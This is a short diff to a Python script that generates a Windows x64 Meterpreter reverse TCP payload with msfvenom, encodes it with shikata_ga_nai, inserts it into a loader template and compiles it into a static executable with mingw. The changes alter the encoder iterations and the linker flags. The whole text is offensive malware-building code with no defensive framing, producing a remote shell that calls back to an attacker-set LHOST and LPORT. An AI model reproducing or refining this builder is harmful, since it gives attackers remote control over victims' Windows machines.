@@ -20,7 +20,7 @@ payload_creator = sb.Popen(["msfvenom",
                             "windows/x64/meterpreter_reverse_tcp",
                             "-e",
                             "x86/shikata_ga_nai",
-                            "-i", "10",
+                            "-i", "2",
                             f'LHOST={LHOST}',
                             f'LPORT={LPORT}',
                             "-f",
@@ -39,7 +39,7 @@ insert_payload(RAW_CODE_FILE, LOADER_TEMPLATE, GEN_CODE)
 print('Compiling generated code...')
 
 compiler = sb.Popen(["x86_64-w64-mingw32-g++", GEN_CODE,
-                     '-o', LOADER_EXE, '-static-libstdc++'])
+                     '-o', LOADER_EXE,  '-static', '-lpthread'])
 
 if compiler.wait() != 0:
     print('Error compiling generated code!')
